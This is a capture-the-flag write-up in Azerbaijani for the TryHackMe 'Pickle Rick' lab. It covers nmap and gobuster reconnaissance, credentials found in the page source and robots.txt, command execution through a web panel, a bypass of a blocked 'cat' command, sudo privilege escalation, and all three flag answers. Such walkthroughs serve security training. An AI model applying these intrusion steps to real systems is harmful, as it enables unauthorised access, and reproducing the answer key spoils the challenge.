# TryHackMe — Pickle Rick Writeup

**Çətinlik:** Easy  
**Platforma:** TryHackMe  
**Məqsəd:** 3 ingredient (flag) tap — Rick-i yenidən insana çevir

---

## Tapşırıqlar

```
1. Birinci ingredient nədir?
2. İkinci ingredient nədir?
3. Üçüncü ingredient nədir?
```

---

## Addım 1 — Nmap Skan

VM başladıqdan sonra hədəf IP-ni al və skan et:

```bash
nmap -sV -sC <TARGET_IP>
```

**Nəticə:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Port 22 (SSH) açıqdır amma credentials yoxdur. Port 80 (HTTP) üzərindən davam edirik.

---

## Addım 2 — Veb Səhifəni Araşdır

Brauzerdə `http://<TARGET_IP>` aç. Sadə bir səhifə görünür.

### Page Source-da username tap

`Ctrl+U` ilə page source-u aç. HTML şərhləri arasında gizli username var:

```html
<!-- Note to self, remember username!
Username: R1ckRul3s
-->
```

**Username: `R1ckRul3s`**

### robots.txt-i yoxla

```
http://<TARGET_IP>/robots.txt
```

İçində yazır:
```
Wubbalubbadubdub
```

Bu şifrə kimi görünür. **Password: `Wubbalubbadubdub`**

---

## Addım 3 — GoBuster ilə Gizli Faylları Tap

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt
```

**Tapılan fayllar:**
```
/login.php
/portal.php
/robots.txt
/clue.txt
```

---

## Addım 4 — Login ol

`http://<TARGET_IP>/login.php` aç və daxil ol:

```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

Login uğurlu olur → `portal.php` səhifəsinə yönləndirilirsin. Bu səhifədə **Command Panel** var — Linux komandaları icra etmək mümkündür.

---

## Addım 5 — Birinci Ingredient

Command Panel-də əvvəlcə mövcud faylları gör:

```bash
ls
```

**Nəticə:**
```
Sup3rS3cretPickl3Ingred.txt
clue.txt
```

`cat` komandası bloklanıb. Bunun əvəzinə `less` istifadə et:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

### 🥒 Birinci Ingredient: `mr. meeseek hair`

---

## Addım 6 — Clue.txt-i oxu

```bash
less clue.txt
```

**Məzmun:**
```
Look around the file system for the other ingredient.
```

Fayl sistemini araşdırmaq lazımdır.

---

## Addım 7 — İkinci Ingredient

`/home` qovluğunda istifadəçiləri yoxla:

```bash
ls /home
```

**Nəticə:**
```
rick
ubuntu
```

`rick` istifadəçisinin qovluğuna bax:

```bash
ls -l /home/rick
```

**Nəticə:**
```
second ingredients
```

Fayl adında boşluq olduğu üçün dırnaq içində yaz:

```bash
less /home/rick/"second ingredients"
```

### 🥒 İkinci Ingredient: `1 jerry tear`

---

## Addım 8 — Üçüncü Ingredient (Privilege Escalation)

Cari istifadəçinin sudo səlahiyyətlərini yoxla:

```bash
sudo -l
```

**Nəticə:**
```
(ALL) NOPASSWD: ALL
```

`www-data` istifadəçisi şifresiz olaraq **hər komandanı root kimi** icra edə bilir!

`/root` qovluğuna bax:

```bash
sudo ls -al /root
```

**Nəticə:**
```
3rd.txt
```

Faylı oxu:

```bash
sudo less /root/3rd.txt
```

### 🥒 Üçüncü Ingredient: `fleeb juice`

---

## Cavablar Xülasəsi

| Sual | Cavab |
|---|---|
| Birinci ingredient | `mr. meeseek hair` |
| İkinci ingredient | `1 jerry tear` |
| Üçüncü ingredient | `fleeb juice` |

---

## Attack Yolu Xülasəsi

```
Nmap skan
  → Port 80 açıqdır
    → Page Source → Username: R1ckRul3s
    → robots.txt  → Password: Wubbalubbadubdub
      → GoBuster  → login.php tapıldı
        → Login uğurlu → Command Panel
          → less Sup3rS3cretPickl3Ingred.txt → Flag 1
          → less /home/rick/"second ingredients" → Flag 2
          → sudo -l → NOPASSWD: ALL
            → sudo less /root/3rd.txt → Flag 3
```

---

## İstifadə Olunan Alətlər

| Alət | Məqsəd |
|---|---|
| `nmap` | Port skanı |
| `gobuster` | Gizli fayl/qovluq axtarışı |
| `less` | Fayl oxumaq (`cat` bloklandığı üçün) |
| `sudo -l` | Sudo icazələrini yoxlamaq |
